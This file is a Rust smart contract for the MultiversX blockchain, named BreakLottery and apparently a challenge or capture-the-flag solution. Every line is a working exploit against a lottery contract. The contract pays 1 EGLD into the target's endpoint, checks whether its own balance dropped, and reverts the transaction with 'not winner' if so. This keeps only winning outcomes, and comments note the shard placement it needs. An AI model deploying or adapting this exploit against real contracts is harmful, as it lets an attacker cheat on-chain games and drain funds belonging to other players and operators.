#![no_std]

multiversx_sc::imports!();
multiversx_sc::derive_imports!();

pub const ONE_EGLD: u64 = 1_000_000_000_000_000_000;

mod callee_proxy {
    multiversx_sc::imports!();

    #[multiversx_sc::proxy]
    pub trait CalleeContract {
        #[payable("EGLD")]
        #[endpoint(wrongEndpoint)]
        fn wrong_endpoint(&self);
    }
}

#[multiversx_sc::contract]
pub trait BreakLottery {
    #[init]
    fn init(&self, sc_address: OptionalValue<ManagedAddress>) {
        match sc_address {
            OptionalValue::Some(val) => self.sc_address().set(val),
            OptionalValue::None => require!(!self.sc_address().is_empty(), "sc address is empty"),
        }
    }

    #[only_owner]
    #[endpoint(callSc)]
    fn call_sc(&self) {
        //contract must be in the same shard as target contract
        //contract will be in the same shard as owner wallet
        let contract_address = self.sc_address().get();
        let balance = self
            .blockchain()
            .get_sc_balance(&EgldOrEsdtTokenIdentifier::egld(), 0u64);

        let _: IgnoreValue = self
            .contract_proxy(contract_address)
            .wrong_endpoint()
            .with_egld_transfer(BigUint::from(ONE_EGLD))
            .with_gas_limit(self.blockchain().get_gas_left())
            .execute_on_dest_context();

        let balance_after = self
            .blockchain()
            .get_sc_balance(&EgldOrEsdtTokenIdentifier::egld(), 0u64);

        if &balance_after < &balance {
            sc_panic!("not winner");
        }
    }

    #[storage_mapper("scAddress")]
    fn sc_address(&self) -> SingleValueMapper<ManagedAddress>;

    #[proxy]
    fn contract_proxy(&self, sc_address: ManagedAddress) -> callee_proxy::Proxy<Self::Api>;
}
